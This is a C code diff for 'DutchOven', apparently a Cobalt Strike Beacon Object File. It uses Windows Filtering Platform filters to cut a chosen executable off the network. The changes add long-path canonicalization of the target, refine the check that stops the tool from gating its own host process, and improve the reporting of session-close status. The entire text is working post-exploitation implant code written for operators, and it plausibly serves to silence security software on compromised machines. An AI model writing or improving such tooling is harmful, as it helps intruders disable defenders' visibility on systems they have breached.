@@ -98,10 +98,11 @@ static const char *do_bof_profile_name(int profile) {
     }
 }
 
-static void do_bof_release(do_bof_gate *gate) {
+static DWORD do_bof_release(do_bof_gate *gate) {
     /* Engine close tears down every object in the dynamic session if explicit deletion failed. */
+    DWORD status = ERROR_SUCCESS;
     if (gate->engine != NULL) {
-        (void)FwpmEngineClose0(gate->engine);
+        status = FwpmEngineClose0(gate->engine);
         gate->engine = NULL;
     }
     if (gate->app_id != NULL) {
@@ -109,6 +110,7 @@ static void do_bof_release(do_bof_gate *gate) {
         gate->app_id = NULL;
     }
     gate->filter_count = 0U;
+    return status;
 }
 
 static DWORD do_bof_open(do_bof_gate *gate, const wchar_t *path) {
@@ -132,7 +134,7 @@ static DWORD do_bof_open(do_bof_gate *gate, const wchar_t *path) {
 
     uuid_status = UuidCreate(&gate->sublayer_key);
     if (uuid_status != RPC_S_OK && uuid_status != RPC_S_UUID_LOCAL_ONLY) {
-        do_bof_release(gate);
+        (void)do_bof_release(gate);
         return (DWORD)uuid_status;
     }
 
@@ -144,13 +146,13 @@ static DWORD do_bof_open(do_bof_gate *gate, const wchar_t *path) {
     sublayer.weight = 0xffffU;
     status = FwpmSubLayerAdd0(gate->engine, &sublayer, NULL);
     if (status != ERROR_SUCCESS) {
-        do_bof_release(gate);
+        (void)do_bof_release(gate);
         return status;
     }
 
     status = FwpmGetAppIdFromFileName0(path, &gate->app_id);
     if (status != ERROR_SUCCESS) {
-        do_bof_release(gate);
+        (void)do_bof_release(gate);
     }
     return status;
 }
@@ -233,6 +235,7 @@ void go(char *args, int length) {
     datap parser;
     do_bof_gate gate;
     wchar_t full_path[DO_BOF_PATH_CAPACITY];
+    wchar_t canonical_path[DO_BOF_PATH_CAPACITY];
     wchar_t current_process[DO_BOF_PATH_CAPACITY];
     wchar_t *path;
     int path_bytes = 0;
@@ -242,10 +245,13 @@ void go(char *args, int length) {
     DWORD attributes;
     DWORD status;
     DWORD cleanup_status;
+    DWORD close_status;
+    UINT32 remaining_filters;
 
     /* Aggressor packs a NUL-terminated UTF-16 path followed by a 32-bit profile identifier. */
     do_bof_zero(&gate, sizeof(gate));
     do_bof_zero(full_path, sizeof(full_path));
+    do_bof_zero(canonical_path, sizeof(canonical_path));
     do_bof_zero(current_process, sizeof(current_process));
     BeaconDataParse(&parser, args, length);
     path = (wchar_t *)BeaconDataExtract(&parser, &path_bytes);
@@ -275,7 +281,13 @@ void go(char *args, int length) {
         BeaconPrintf(CALLBACK_ERROR, "DutchOven: unable to resolve the target path");
         return;
     }
-    attributes = GetFileAttributesW(full_path);
+    /* Match WFP's long-form image identity when the operator supplies an 8.3 path alias. */
+    path_length = GetLongPathNameW(full_path, canonical_path, DO_BOF_PATH_CAPACITY);
+    if (path_length == 0U || path_length >= DO_BOF_PATH_CAPACITY) {
+        BeaconPrintf(CALLBACK_ERROR, "DutchOven: unable to canonicalize the target path");
+        return;
+    }
+    attributes = GetFileAttributesW(canonical_path);
     if (attributes == INVALID_FILE_ATTRIBUTES ||
         (attributes & FILE_ATTRIBUTE_DIRECTORY) != 0U) {
         BeaconPrintf(CALLBACK_ERROR, "DutchOven: target is not an executable file");
@@ -283,15 +295,22 @@ void go(char *args, int length) {
     }
 
     /* Self-gating could sever Beacon's transport before this inline BOF can clean up. */
-    path_length = GetModuleFileNameW(NULL, current_process, DO_BOF_PATH_CAPACITY);
-    if (path_length > 0U && path_length < DO_BOF_PATH_CAPACITY &&
-        lstrcmpiW(full_path, current_process) == 0) {
-        BeaconPrintf(CALLBACK_ERROR,
-                     "DutchOven: refusing to gate the process that is hosting this BOF");
-        return;
+    path_length = GetModuleFileNameW(NULL, full_path, DO_BOF_PATH_CAPACITY);
+    if (path_length > 0U && path_length < DO_BOF_PATH_CAPACITY) {
+        DWORD canonical_length =
+            GetLongPathNameW(full_path, current_process, DO_BOF_PATH_CAPACITY);
+        const wchar_t *host_path =
+            canonical_length > 0U && canonical_length < DO_BOF_PATH_CAPACITY
+                ? current_process
+                : full_path;
+        if (lstrcmpiW(canonical_path, host_path) == 0) {
+            BeaconPrintf(CALLBACK_ERROR,
+                         "DutchOven: refusing to gate the process that is hosting this BOF");
+            return;
+        }
     }
 
-    status = do_bof_open(&gate, full_path);
+    status = do_bof_open(&gate, canonical_path);
     if (status != ERROR_SUCCESS) {
         BeaconPrintf(CALLBACK_ERROR, "DutchOven: WFP setup failed with status %lu", status);
         return;
@@ -300,8 +319,18 @@ void go(char *args, int length) {
     if (status != ERROR_SUCCESS) {
         BeaconPrintf(CALLBACK_ERROR, "DutchOven: filter transaction failed with status %lu",
                      status);
-        do_bof_release(&gate);
-        BeaconPrintf(CALLBACK_OUTPUT, "DutchOven: CLEAN filters=0 session=closed");
+        remaining_filters = gate.filter_count;
+        close_status = do_bof_release(&gate);
+        if (close_status == ERROR_SUCCESS) {
+            remaining_filters = 0U;
+        }
+        if (close_status == ERROR_SUCCESS) {
+            BeaconPrintf(CALLBACK_OUTPUT, "DutchOven: CLEAN filters=0 session=closed");
+        } else {
+            BeaconPrintf(CALLBACK_ERROR,
+                         "DutchOven: dynamic session close failed with status %lu; filters=%lu",
+                         close_status, remaining_filters);
+        }
         return;
     }
 
@@ -312,11 +341,27 @@ void go(char *args, int length) {
 
     /* Explicit deletion produces a clear audit trail; session close remains authoritative cleanup. */
     cleanup_status = do_bof_pass(&gate);
-    do_bof_release(&gate);
-    if (cleanup_status != ERROR_SUCCESS) {
-        BeaconPrintf(CALLBACK_ERROR,
-                     "DutchOven: explicit filter removal returned %lu; dynamic session closed",
-                     cleanup_status);
+    remaining_filters = gate.filter_count;
+    close_status = do_bof_release(&gate);
+    if (close_status == ERROR_SUCCESS) {
+        remaining_filters = 0U;
     }
-    BeaconPrintf(CALLBACK_OUTPUT, "DutchOven: CLEAN filters=0 session=closed");
+    if (cleanup_status != ERROR_SUCCESS) {
+        if (close_status == ERROR_SUCCESS) {
+            BeaconPrintf(CALLBACK_ERROR,
+                         "DutchOven: explicit filter removal returned %lu; dynamic session closed",
+                         cleanup_status);
+        } else {
+            BeaconPrintf(CALLBACK_ERROR,
+                         "DutchOven: explicit removal returned %lu; session close returned %lu",
+                         cleanup_status, close_status);
+        }
+    }
+    if (close_status == ERROR_SUCCESS) {
+        BeaconPrintf(CALLBACK_OUTPUT, "DutchOven: CLEAN filters=0 session=closed");
+    } else {
+        BeaconPrintf(CALLBACK_ERROR,
+                     "DutchOven: CLEAN filters=%lu session=close_failed status=%lu",
+                     remaining_filters, close_status);
+    }
 }
